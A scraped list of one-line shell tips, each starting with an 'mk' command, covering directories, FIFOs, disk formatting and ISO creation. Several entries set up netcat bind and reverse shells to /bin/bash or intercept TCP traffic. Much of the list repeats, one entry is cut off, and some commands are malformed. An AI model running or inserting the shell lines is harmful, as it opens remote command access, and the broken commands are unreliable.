# Making a directory using bash or cmd
mkdir <dir name>

# Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo

# tiny proxy in shell to receive on port and write on unix socket
mk

# tiny proxy in shell to receive on port and write on unix socket
mknod replypipe p; nc -k -lp 1234 < replypipe| nc -U /var/run/mysocket.sock > replypipe

# Extract 2 copies of .tar.gz content
mkdir copy{1,2}; gzip -dc file.tar.gz | tee >( tar x -C copy1/ ) | tar x -C copy2/

# Batch Convert MP3 Bitrate
mkdir save && for f in *.mp3; do lame -b xxx "$f" ./save/"${f%.mp3}.mp3"; done

# execute a shell with netcat without -e
mkfifo ._b; nc -lk 4201 0<._b | /bin/bash &>._b;

# Format partition as FAT32
mkdosfs -F 32 /dev/sda1

# Batch remove protection from all pdf files in a directory
mkdir -p temp && for f in *.pdf ; do qpdf password=YOURPASSWORDHERE decrypt "$f" "temp/$f"; done && mv temp/* . && rm -rf temp

# rsync from one remote to another remote, only local computer has an open ssh key
mkdir r1 && sshfs remote1:/home/user r1 && rsync r1/stuff remote2:~/backups/

# Move all epub keyword containing files to Epub folder
mkdir Epub ; mv -v target-directory=Epub $(fgrep -lr epub *)

# make multiple directories
mkdir {1..100}

# Mount a CD-ROM on Solaris (SPARC)
mkdir -p /cdrom/unnamed_cdrom ; mount -F hsfs -o ro `ls -al /dev/sr* |awk '{print "/dev/" $11}'` /cdrom/unnamed_cdrom

# generate /etc/shadow-style password
mkpasswd -5 pa33w0rd saltsalt

# create an empty NTFS partition
mkntfs /dev/hda1

# Overcome Bash's expansion order
mkdir ${1..10}

# Random password generating function
mkpasswd() { head -c $(($1)) /dev/urandom | uuencode - | sed -n 's/.//;2s/\(.\{'$1'\}\).*/\1/p' ;}

# journaling directories
mkdir `date | sed 's/[: ]/_/g'`

# make directory tree
mkdir -p work/{d1,d2}/{src,bin,bak}

# make 100 directories with leading zero, 001...100, using bash3.X
mkdir 0{0..9}{0..9};mv 000 100

# replace text in all files in folder, into subfolder
mkdir replaced;for i in *; do cat "$i"| sed 's/foo/bar/' > "replaced/$i"; done

# Go to the created directory after using mkdir
mkdir() { /bin/mkdir $@ && eval cd "\$$#"; }

# mkgo - Create a Directory and immediate go into it
mkgo newdir

# create iso image from a directory
mkisofs -o XYZ.iso XYZ/

# Intercept, monitor and manipulate a TCP connection.
mkfifo /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine port | tee -a from.log > /tmp/fifo

# Network Proxy to dump the application level forward traffic in plain text in the console and in a file.
mkfifo fifo; while true ; do      echo "Waiting for new event";     nc -l 8080 < fifo | tee -a proxy.txt /dev/stderr | nc 192.168.0.1 80 > fifo ;  done

# Viewable terminal session over network.
mkfifo /tmp/view; nc -l 9876 < /tmp/view& script -f /tmp/view

# Losslessly rotate videos from your phone by 90 degrees.
mkdir rotated; for v in *.3gp; do ffmpeg -i $v -vf transpose=2 -vcodec ffv1 rotated/${v/3gp/avi} ; done

# Use the arguments used in the last command
mkdir !*

# Ext3 format Terabytes in Seconds
mkfs.ext3 -T largefile4

# Share your terminal session real-time
mkfifo foo; script -f foo

# Make a directory named with the current date
mkdir `date iso`

# analyze traffic remotely over ssh w/ wireshark
mkfifo /tmp/fifo; ssh-keygen; ssh-copyid root@remotehostaddress; sudo ssh root@remotehost "tshark -i eth1 -f 'not tcp port 22' -w -" > /tmp/fifo &; sudo wireshark -k -i /tmp/fifo;

# make 100 directories with leading zero, 001...100, using bash3.X
mkdir $(printf '%03d\n' {1..100})

# make directory with current date
mkdir $(date +%Y_%m_%d)

# make directory with current date
mkdir $(date +%F)

# execute a shell with netcat without -e
mkfifo pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe

# Phrack 66 is out, but the .tar.gz is not there yet on phrack.org's website
mkdir phrack66; (cd phrack66; for n in {1..17} ; do echo "http://www.phrack.org/issues.html?issue=66&id=$n&mode=txt" ; done | xargs wget)

# Format partition with ext4 but without a journal
mke2fs -t ext4 -O ^has_journal /dev/sdXN

# Collect a lot of icons from /usr/share/icons (may overwrite some, and complain a bit)
mkdir myicons && find /usr/share/icons/ -type f | xargs cp -t myicons

# Collect a lot of icons from /usr/share/icons (may overwrite some, and complain a bit)
mkdir myicons; find /usr/share/icons/ -type f -exec cp {} ./myicons/ \;

# create dir tree
mkdir -p doc/{text/,img/{wallpaper/,photos/}}

# Create the directoty recursively
mkdir  /home/dhinesh/dir1/{dir2,dir3,dir4}/file1.txt -p

# quickly formats a fat partition. usefull for flash drives
mkfs.vfat /dev/sdc1

# quickly formats a fat partition. usefull for flash drives
mkdosfs /dev/sdx1

# mkdir & cd into it as single command
mkdir /home/foo/doc/bar && cd $_

# mkdir & cd into it as single command
mkdir /home/foo/doc/bar && cd $_

# Make ISO image of a folder
mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/OpenCD

# Creates a SSHFS volume on MacOS X (better used as an alias). Needs FuseFS and SSHFS (obvioulsly).
mkdir /Volumes/sshdisk 2> /dev/null; sshfs user@server:/ /Volumes/sshdisk -oreconnect,volname=SSHDisk

# Create a directory and go inside it
mkdir dir; cd $_

# Function to create an alias on the fly
mkalias () { echo "alias $1=\"$2\"" >> ~\.bash_aliases }

# Make directory including intermediate directories
mkdir -p a/long/directory/path

# Make directory including intermediate directories
mkdir -p a/long/directory/path

# Create directory named after current date
mkdir $(date +%Y%m%d)

# make directory
mkdir /tmp/dir1/{0..20}

# extract and initrd image
mkdir tmp ; cd tmp ; zcat ../initrd.gz | cpio -i

# Shorthand for proper mktemp inside $TMPDIR
mktemp!() { mktemp $TMPDIR$1.XXXXXXXXXX }

# Make directory and change into immediately (No functions!)
mkdir -p /path/to/folder.d; \cd $_

# Make a new dir named with present week numer
mkdir -v `date +%W`W

# execute a shell with netcat without -e
mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe

# snapshot partition for consistent backups with minimal downtime
mksnap_ffs /var /var/.snap/snap_var_`date "+%Y-%m-%d"` ;  mdconfig -a -t vnode -f /var/.snap/snap_var_`date "+%Y-%m-%d"` -u 1; mount -r /dev/md1 /mnt

# generate hash for puppet
mkpasswd -m sha-512

# Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo

# make directory tree
mkdir -p work/{d1,d2}/{src,bin,bak}

# create iso image from a directory
mkisofs -o XYZ.iso XYZ/

# Intercept, monitor and manipulate a TCP connection.
mkfifo /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine port | tee -a from.log > /tmp/fifo

# Network Proxy to dump the application level forward traffic in plain text in the console and in a file.
mkfifo fifo; while true ; do      echo "Waiting for new event";     nc -l 8080 < fifo | tee -a proxy.txt /dev/stderr | nc 192.168.0.1 80 > fifo ;  done

# Viewable terminal session over network.
mkfifo /tmp/view; nc -l 9876 < /tmp/view& script -f /tmp/view

# Losslessly rotate videos from your phone by 90 degrees.
mkdir rotated; for v in *.3gp; do ffmpeg -i $v -vf transpose=2 -vcodec ffv1 rotated/${v/3gp/avi} ; done

# Use the arguments used in the last command
mkdir !*

# Ext3 format Terabytes in Seconds
mkfs.ext3 -T largefile4

# Share your terminal session real-time
mkfifo foo; script -f foo

# Make a directory named with the current date
mkdir `date iso`

# analyze traffic remotely over ssh w/ wireshark
mkfifo /tmp/fifo; ssh-keygen; ssh-copyid root@remotehostaddress; sudo ssh root@remotehost "tshark -i eth1 -f 'not tcp port 22' -w -" > /tmp/fifo &; sudo wireshark -k -i /tmp/fifo;

# make 100 directories with leading zero, 001...100, using bash3.X
mkdir $(printf '%03d\n' {1..100})

# make directory with current date
mkdir $(date +%Y_%m_%d)

# make directory with current date
mkdir $(date +%F)

# execute a shell with netcat without -e
mkfifo pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe

# Phrack 66 is out, but the .tar.gz is not there yet on phrack.org's website
mkdir phrack66; (cd phrack66; for n in {1..17} ; do echo "http://www.phrack.org/issues.html?issue=66&id=$n&mode=txt" ; done | xargs wget)

# Format partition with ext4 but without a journal
mke2fs -t ext4 -O ^has_journal /dev/sdXN

# Collect a lot of icons from /usr/share/icons (may overwrite some, and complain a bit)
mkdir myicons && find /usr/share/icons/ -type f | xargs cp -t myicons

# Collect a lot of icons from /usr/share/icons (may overwrite some, and complain a bit)
mkdir myicons; find /usr/share/icons/ -type f -exec cp {} ./myicons/ \;

# create dir tree
mkdir -p doc/{text/,img/{wallpaper/,photos/}}

# Create the directoty recursively
mkdir  /home/dhinesh/dir1/{dir2,dir3,dir4}/file1.txt -p

# quickly formats a fat partition. usefull for flash drives
mkfs.vfat /dev/sdc1

# quickly formats a fat partition. usefull for flash drives
mkdosfs /dev/sdx1

# mkdir & cd into it as single command
mkdir /home/foo/doc/bar && cd $_

# Make ISO image of a folder
mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/OpenCD

# Creates a SSHFS volume on MacOS X (better used as an alias). Needs FuseFS and SSHFS (obvioulsly).
mkdir /Volumes/sshdisk 2> /dev/null; sshfs user@server:/ /Volumes/sshdisk -oreconnect,volname=SSHDisk

# Create a directory and go inside it
mkdir dir; cd $_

# Function to create an alias on the fly
mkalias () { echo "alias $1=\"$2\"" >> ~\.bash_aliases }

# Make directory including intermediate directories
mkdir -p a/long/directory/path

# Create directory named after current date
mkdir $(date +%Y%m%d)

# make directory
mkdir /tmp/dir1/{0..20}

# extract and initrd image
mkdir tmp ; cd tmp ; zcat ../initrd.gz | cpio -i

# Shorthand for proper mktemp inside $TMPDIR
mktemp!() { mktemp $TMPDIR$1.XXXXXXXXXX }

# Make directory and change into immediately (No functions!)
mkdir -p /path/to/folder.d; \cd $_

# execute a shell with netcat without -e
mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
